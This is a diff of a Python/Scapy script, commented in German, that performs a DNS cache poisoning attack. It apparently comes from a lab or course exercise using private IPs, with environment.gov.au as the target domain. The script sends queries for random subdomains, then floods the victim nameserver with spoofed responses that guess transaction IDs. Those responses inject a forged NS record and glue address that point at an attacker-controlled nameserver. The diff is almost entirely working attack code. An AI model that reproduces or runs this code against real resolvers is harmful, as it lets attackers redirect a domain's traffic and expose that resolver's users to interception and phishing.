@@ -5,15 +5,16 @@ import threading, socket
 
 
 
-bad_guy = '192.168.1.229'
-fake_ns_server = '192.168.1.246'
+bad_guy = '192.168.1.229'          # unsere ip addresse (fuer anfrage)
+fake_ns_server = '192.168.1.246'   # das was wir dem cache infizieren wollen
 
-victim_url = 'environment.gov.au'#'google.de'#
-victim_ns = '192.168.1.2'
+victim_url = 'environment.gov.au' # url dessen cache gepoisened werden soll
+victim_ns = '192.168.1.2'         # nameserver der angegeriffen wird
 fix_port = 32772
 
 dns_ttl = 60*60*24*15
-dns_qd_ns=DNSQR(qname=victim_url,qtype='NS',qclass='IN')
+dns_qd_ns=DNSQR(qname=victim_url,qtype='NS',qclass='IN')    # querry data fuer die zone_ns anfrage
+
 
 #dynamisch ermittelt:
 global zone_ns
@@ -28,7 +29,7 @@ def sendRequest():
         rand_id = random.randint(0, 2**16)
         tmp=tmp+1
         
-        dns_qd=DNSQR(qname=str(tmp)+'.'+victim_url,qtype='A',qclass='IN')
+        dns_qd=DNSQR(qname=str(tmp)+'.'+victim_url,qtype='A',qclass='IN') # anfrage an den nameserver
         
         request = Ether()/IP(dst=victim_ns,src=bad_guy,flags=2)/UDP(dport=53,sport=53)/DNS(id=1337,qr=0,rd=1,qd=dns_qd)
         ip = Ether()/IP(dst=victim_ns, src=zone_ns_url)/UDP(dport=fix_port, sport=53)
@@ -36,13 +37,13 @@ def sendRequest():
         pkt_list.append(request)
         print 'Cache Poisoning auf '+victim_url+' ...'
         for i in range(100):
-            rand_id = (rand_id+1)%2**16#hex(rand_id)
+            rand_id = (rand_id+1)%2**16
             pkt_list.append(ip/DNS(id=rand_id,rd=0, ra=0, qr=1, aa=1, qd=dns_qd, ns = DNSRR(type='NS',rrname=victim_url, ttl=dns_ttl, rdata='rapunzel.'+victim_url),ar=DNSRR(type='A',rrname='rapunzel.'+victim_url, ttl=dns_ttl, rdata=fake_ns_server)))
 
         sendpfast(pkt_list, loop=0, pps=250)
 
         set_ns(victim_url)
-        #cache = check_cache(dns_qd)
+        
         if zone_ns!=fake_ns_server:
             print 'Angriff noch nicht erfolgreich, neue Subdomain'
         if zone_ns==fake_ns_server:
